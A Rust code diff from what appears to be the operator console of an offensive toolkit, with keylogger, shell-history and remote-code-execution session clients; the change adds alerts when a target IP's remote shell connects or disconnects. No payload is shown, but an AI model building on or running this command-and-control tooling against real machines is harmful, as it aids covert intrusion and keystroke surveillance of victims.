@@ -5,11 +5,14 @@ use std::{
 };
 
 use tamanoir_common::Layout;
+use tokio::sync::mpsc;
 use tokio_stream::StreamExt;
 use tonic::{transport::Channel, Request};
 
 use crate::{
     app::{AppResult, SessionsMap},
+    event::Event,
+    notification::NotificationSender,
     section::{
         keylogger::init_keymaps,
         shell::{ShellCommandEntry, ShellCommandHistoryMap, ShellHistoryEntryType},
@@ -24,6 +27,7 @@ use crate::{
 #[derive(Debug, Clone)]
 pub struct SessionServiceClient {
     pub client: SessionClient<Channel>,
+    pub notification_sender: NotificationSender,
 }
 
 #[derive(Debug, Clone)]
@@ -37,10 +41,20 @@ pub struct RceServiceClient {
 }
 
 impl SessionServiceClient {
-    pub async fn new(ip: Ipv4Addr, port: u16) -> AppResult<Self> {
+    pub async fn new(
+        ip: Ipv4Addr,
+        port: u16,
+        event_sender: mpsc::UnboundedSender<Event>,
+    ) -> AppResult<Self> {
         let client = SessionClient::connect(format!("http://{}:{}", ip, port)).await?;
         init_keymaps();
-        Ok(Self { client })
+        Ok(Self {
+            client,
+            notification_sender: NotificationSender {
+                sender: event_sender,
+                ttl: 3,
+            },
+        })
     }
     pub async fn list_sessions(&mut self) -> AppResult<Vec<SessionResponse>> {
         Ok(self
@@ -172,7 +186,28 @@ impl StreamReceiver<HashMap<String, SessionResponse>> for SessionServiceClient {
             .into_inner();
         while let Some(msg) = stream.next().await {
             let msg = msg?;
-            update_object.write().unwrap().insert(msg.ip.clone(), msg);
+
+            // compare session old state to new state to catch events we want to send notification for
+            if let Some(session) = update_object.read().unwrap().get(&msg.ip.clone()) {
+                if session.shell_availability != msg.shell_availability {
+                    match msg.shell_availability {
+                        true => {
+                            let _ = self
+                                .notification_sender
+                                .info(format!("{}: New Shell Connection", msg.ip));
+                        }
+                        false => {
+                            let _ = self
+                                .notification_sender
+                                .warning(format!("{}: Shell Disconnected", msg.ip));
+                        }
+                    }
+                }
+            }
+            update_object
+                .write()
+                .unwrap()
+                .insert(msg.ip.clone(), msg.clone());
         }
         Ok(())
     }
